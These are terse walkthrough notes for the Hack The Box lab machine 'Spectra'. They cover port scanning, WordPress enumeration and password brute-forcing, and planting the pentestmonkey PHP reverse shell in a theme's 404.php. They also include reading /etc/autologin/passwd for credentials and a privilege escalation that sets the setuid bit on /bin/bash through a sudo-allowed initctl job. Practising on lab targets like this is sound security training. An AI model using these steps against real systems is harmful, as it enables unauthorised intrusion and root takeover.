# Spectra

> /etc/hosts spectra.htb

0. Nmap
> nmap -v -sV -sC -T5 -oN initial 10.10.10.229
``` 
Nmap scan report for 10.10.10.229
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 29 20:57:21 2021 -- 1 IP address (1 host up) scanned in 25.89 seconds
```

**Port 80** 

1. Jira
``` bash 
curl -s 10.10.10.229 | grep -i "jira" 1>/dev/null && echo "OK"
```

2. WordPress 
``` bash 
curl -s http://spectra.htb/main/ | grep -i "wordpress" 1>/dev/null && echo "OK"
wpscan --url http://spectra.htb/main/ -e u
wpscan --url http://spectra.htb/main/ 
wpscan --url http://spectra.htb/main --passwords ~/Downloads/rockyou.txt --usernames user -t 50
```

3. dir
``` bash
wfuzz -c -z file,/opt/node-dirbuster/lists/directory-list-2.3-medium.txt --hc 404 http://spectra.htb/FUZZ
```

> USERS
```
user : user (wp)
user: user (db)
```

### dir
```
main
wp
testing 
index-of
files 
wp-admin/                                          
wp-content/                                       
wp-includes/                                       
index.php                                          
license.txt                                        
readme.html                                        
wp-activate.php                                    
wp-blog-header.php                                 
wp-comments-post.php                               
wp-config.php                                      
wp-config.php.save
wp-cron.php                                        
wp-links-opml.php                                  
wp-load.php                                        
wp-login.php                                       
wp-mail.php                                        
wp-settings.php                                    
wp-signup.php                                    
wp-trackback.php                                   
xmlrpc.php 
```

**PORT 22** 

> failed access with users


**PORT 3306** 

> connect with user no db, failed 


``` 
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php
```

> cat /etc/issue
```
Developer Console
To return to the browser, press:

  [ Ctrl ] and [ Alt ] and [ <- ]  (F1)

To use this console, developer mode must be enabled.
Doing so will destroy any saved data on the system.

In developer mode, it is possible to
- login and sudo as user 'chronos'
- require a password for sudo and login(*)
- disable power management behavior (screen dimming):
  sudo initctl stop powerd
- install your own operating system image!

* To set a password for 'chronos', run the following as root:

chromeos-setdevpasswd

If you are having trouble booting a self-signed kernel, you may need to
enable USB booting.  To do so, run the following as root:

enable_dev_usb_boot

Have fun and send patches!
```

**LinPeas**

```bash
cat /etc/autologin/passwd
```

1. user:user
2. grupos? 
	1. developer
3. sudo?
	1. NOPASSWD(initctl)

```bash
sudo -u root /sbin/initctl list
vim /etc/init/test.conf 
script 
	chmod +s /bin/bash
end script
```


